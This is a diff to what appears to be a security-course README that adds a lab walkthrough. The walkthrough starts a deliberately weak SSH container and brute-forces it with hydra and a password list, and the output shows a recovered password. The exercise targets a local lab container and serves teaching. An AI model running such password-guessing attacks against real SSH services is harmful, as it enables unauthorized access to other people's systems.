@@ -35,6 +35,46 @@
 * ``telnet``
 * ``docker``
 
+## Brute attack force
+
+Pull docker image
+
+``docker pull sylvainkalache/264-1```
+
+Run the image
+
+```bash
+ralex@ralex-nb:~$ docker run -p 2222:22 -d -ti sylvainkalache/264-1
+f6e64ceecab2c913fac1a15f2f2f66669dac8fd6b8f9a563ae30810f19852719
+```
+
+```bash
+ralex@ralex-nb:~$ docker ps
+CONTAINER ID   IMAGE                  COMMAND                  CREATED              STATUS              PORTS                                   NAMES
+f6e64ceecab2   sylvainkalache/264-1   "/bin/sh -c 'service…"   About a minute ago   Up About a minute   0.0.0.0:2222->22/tcp, :::2222->22/tcp   quizzical_curran
+ralex@ralex-nb:~$ 
+```
+
+brute force docker with hydra
+
+```bash
+ssh sylvain@localhost -p 2222
+hydra 
+```
+
+```bash
+ralex@ralex-nb:~$ hydra -l sylvain -P passlist.txt ssh://127.0.0.1:2222
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-25 20:39:24
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:1/p:5), ~1 try per task
+[DATA] attacking ssh://127.0.0.1:2222/
+[2222][ssh] host: 127.0.0.1   login: sylvain   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-25 20:39:27
+ralex@ralex-nb:~$ 
+```
 
 ## Author
 
